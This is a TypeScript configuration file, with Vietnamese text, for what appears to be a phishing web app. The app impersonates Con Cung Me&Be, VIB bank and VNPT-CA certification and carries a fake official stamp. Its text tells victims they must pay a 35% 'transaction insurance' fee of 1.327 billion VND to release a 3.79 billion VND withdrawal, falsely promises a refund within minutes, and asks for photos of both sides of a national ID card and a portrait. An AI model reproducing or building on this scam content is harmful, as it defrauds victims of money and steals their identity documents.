
import { ContractData } from './types';

/**
 * 🛠️ MASTER CONFIGURATION - TRUNG TÂM QUẢN LÝ NỘI DUNG
 * 
 * HƯỚNG DẪN:
 * 1. Chỉnh sửa các văn bản trong dấu ngoặc kép "" để thay đổi nội dung hiển thị.
 * 2. Để thêm CON DẤU: Dán link ảnh vào "senderStampUrl". 
 *    Ví dụ: "senderStampUrl": "https://i.imgur.com/your-stamp.png"
 * 3. Sau khi sửa, hãy Save và Deploy lên Netlify để cập nhật ngay.
 */

export const MASTER_CONFIG: ContractData = {
  // ==========================================
  // 1. THÔNG TIN PHÁP LÝ & ĐỊNH DANH (BÊN A)
  // ==========================================
  "senderName": "LƯU ANH TIẾN",
  "senderTitle": "PHÒNG KIỂM SOÁT RỦI RO & AML",
  "companyName": "HỆ THỐNG XÁC MINH GIAO DỊCH QUỐC TẾ",
  "companyAddress": "Đối tác liên kết Ngân hàng VIB - TP. Hồ Chí Minh",
  "taxCode": "AML-SECURE-2024",
  "contractCode": "VIB-AML/VERIFY-3.7B",
  
  // CHÈN LINK ẢNH CON DẤU TẠI ĐÂY (Nền trong suốt .png là tốt nhất)
  "senderStampUrl": "https://i.imgur.com/IDH0t9f.png", 

  // ==========================================
  // 2. THÔNG TIN KHÁCH HÀNG (BÊN B) & SỐ TIỀN
  // ==========================================
  "recipientName": "QUÝ KHÁCH HÀNG",
  "amount": "5.118.687.000 VND",

  // ==========================================
  // 3. GIAO DIỆN CHUNG (HEADER & BRANDING)
  // ==========================================
  "headerBrandName": "CONCUNG",
  "headerBrandSuffix": "ME&BE",
  "headerSubtitle": "BẢO HIỂM GIAO DỊCH Hệ Thống Xác Minh Bảo Hiểm Online",
  "headerStatusLabel": "XÁC THỰC VNPT-CA: HOẠT ĐỘNG",
  "progressLabel": "Tiến độ",

  // ==========================================
  // 4. TRANG CHÀO (WELCOME VIEW)
  // ==========================================
  "welcomeTitle": "BẢO HIỂM RỦI RO GIAO DỊCH CHO KHOẢN TIỀN LỚN BẮT BUỘC THAM GIA",
  "welcomeSubtitle": "Hệ thống ghi nhận lệnh rút tiền giá trị lớn 3.791.620.000 VND. Vui lòng hoàn tất quy trình xác minh an toàn để thực hiện giải ngân.",
  "welcomeButton": "Bắt đầu xác minh an toàn",
  "welcomeSectionHeader": "THAM GIA XÁC MINH BẢO HIỂM",
  "welcomeCheckpoints": [
    "Tiêu chuẩn bảo mật VNPT-CA",
    "Pháp lý tương đương văn bản giấy",
    "Thực hiện trực tuyến 100% bảo mật"
  ],
  "welcomeSslLabel": "Hệ thống mã hóa SSL 256-bit",

  // ==========================================
  // 5. TRANG THÔNG BÁO QUY ĐỊNH (NOTICE VIEW)
  // ==========================================
  "noticeTag": "Thông báo quy định",
  "noticeHeading": "THÔNG BÁO XÁC MINH BẢO HIỂM NGUỒN TIỀN",
  "noticeMainText": "Để thực hiện việc chi trả khoản tiền 3.791.620.000 VND, Quý khách bắt buộc phải hoàn tất xác minh danh tính và bảo hiểm giao dịch 35% (1.327.067.000 VND) để đảm bảo quyền lợi và phòng chống rủi ro tài chính.",
  "noticeAlertBox": "LƯU Ý: Khoản phí bảo hiểm là tiền bảo trợ an toàn, không phát sinh hoa hồng và được hoàn trả 100% kèm tiền gốc ngay sau khi hoàn tất thủ tục. Thời gian nhận tiền: 3-5 phút qua Ngân hàng VIB.",
  "noticeCards": [
    { "title": "Mục tiêu", "desc": "Xác lập cơ sở pháp lý vững chắc cho giao dịch chi trả tài chính có giá trị cao." },
    { "title": "Hình thức", "desc": "Thực hiện ký kết 100% online qua hệ thống chứng thực VNPT-CA bảo mật cao." },
    { "title": "Tính Pháp Lý", "desc": "Có giá trị pháp lý tương đương hợp đồng giấy theo quy định pháp luật hiện hành." }
  ],
  "noticeButton": "Xem Hợp Đồng",

  // ==========================================
  // 6. TRANG XEM VĂN BẢN (REVIEW VIEW)
  // ==========================================
  "reviewNavTitle": "Văn bản xác thực bảo hiểm",
  "reviewStatusLabel": "Trạng thái: Đang chờ xác minh danh tính",
  "reviewButton": "Bắt đầu xác minh",
  "reviewWatermark": "CON CUNG ME & BE",
  "reviewLegalHeader": "CỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM",
  "reviewLegalSubheader": "Độc lập - Tự do - Hạnh phúc",
  "reviewContractTitle": "HỢP ĐỒNG THAM GIA BẢO HIỂM BẮT BUỘC",
  "reviewPartyALabel": "BÊN A (BÊN CHI TRẢ)",
  "reviewPartyBLabel": "BÊN B (BÊN THỤ HƯỞNG)",
  "reviewSignatureAreaA": "BÊN A XÁC NHẬN",
  "reviewSignatureAreaB": "BÊN B XÁC THỰC DANH TÍNH",
  "reviewFooterNote": "VĂN BẢN ĐƯỢC CHỨNG THỰC BỞI HỆ THỐNG KÝ SỐ CONCUNG E-OFFICE",

  // ==========================================
  // 7. TRANG TẢI ẢNH CCCD (VERIFY VIEW)
  // ==========================================
  "verifyTag": "Xác minh sinh trắc học",
  "verifyTitle": "Xác thực danh tính chủ tài khoản",
  "verifySubtitle": "Vui lòng tải lên ảnh CCCD và ảnh chân dung để hoàn tất quy trình bảo hiểm.",
  "verifyLabelFront": "CCCD Mặt Trước",
  "verifyLabelBack": "CCCD Mặt Sau",
  "verifyLabelPortrait": "Ảnh Chân Dung",
  "verifyUploadPrompt": "Nhấn để chọn ảnh",
  "verifySecurityNote": "Hệ thống VNPT-CA đang mã hóa thông tin hình ảnh để bảo mật danh tính tuyệt đối.",
  "verifyCancelBtn": "Quay lại",
  "verifyConfirmBtn": "Xác nhận và Hoàn tất",

  // ==========================================
  // 8. TRANG THÀNH CÔNG (SUCCESS VIEW)
  // ==========================================
  "successTitle": "Hồ Sơ Đã Được Phê Duyệt!",
  "successFeeText": "Lệnh giải ngân tổng cộng 5.118.687.000 VND đã được chuyển sang hệ thống thanh toán ưu tiên của Ngân hàng VIB. Quý khách vui lòng chờ thông báo biến động số dư.",
  "successAmountNote": "Tổng số tiền thực nhận (Gốc + Bảo hiểm)",
  "successTransactionPrefix": "VIB-PAY-AML-SUCCESS",
  "successStatusLabel": "TRẠNG THÁI: ĐÃ XÁC MINH DANH TÍNH",
  "successPrintBtn": "In Hợp Đồng",
  "successDownloadBtn": "Tải PDF gốc",
  "successFooterNote": "Tài liệu bảo mật hệ thống",

  // ==========================================
  // 9. FOOTER & QUYỀN TRUY CẬP
  // ==========================================
  "footerSecurityLabels": ["Xác thực bởi Chính phủ", "Tiêu chuẩn ISO 27001"],
  "footerCopyright": "© 2024 CONCUNG ME&BE — NỀN TẢNG GIAO DỊCH AN TOÀN TUYỆT ĐỐI",
  "adminLoginTitle": "Quyền truy cập Giám đốc",

  // ==========================================
  // 10. CÁC ĐIỀU KHOẢN HỢP ĐỒNG
  // ==========================================
  "clauses": [
    {
      "id": "c1",
      "title": "Điều 1: Xác minh thông tin cá nhân & AML",
      "content": "Quý khách cam kết cung cấp thông tin chính chủ bao gồm Họ tên, Năm sinh, CCCD và chân dung sinh trắc học. Việc này nhằm tuân thủ quy định phòng chống rửa tiền quốc tế và bảo vệ tài khoản cá nhân khỏi các truy cập trái phép."
    },
    {
      "id": "c2",
      "title": "Điều 2: Bảo hiểm giao dịch và Giải ngân",
      "content": "Do giá trị giao dịch lớn, Quý khách cần hoàn tất bảo hiểm 35% giá trị lệnh rút (1.327.067.000 VND). Khoản tiền này nhằm bảo trợ an toàn tuyệt đối cho quá trình giải ngân. Tổng số tiền Quý khách nhận được sau cùng là 5.118.687.000 VND."
    },
    {
      "id": "c3",
      "title": "Điều 3: Thời gian xử lý và Cam kết hoàn trả",
      "content": "Sau khi hoàn tất quy trình xác minh, ngân hàng đối tác VIB sẽ tiến hành giải ngân trong vòng 3-5 phút. Đơn vị bảo hiểm chịu trách nhiệm toàn bộ về tính an toàn của dòng tiền chuyển về tài khoản của Quý khách."
    }
  ]
};
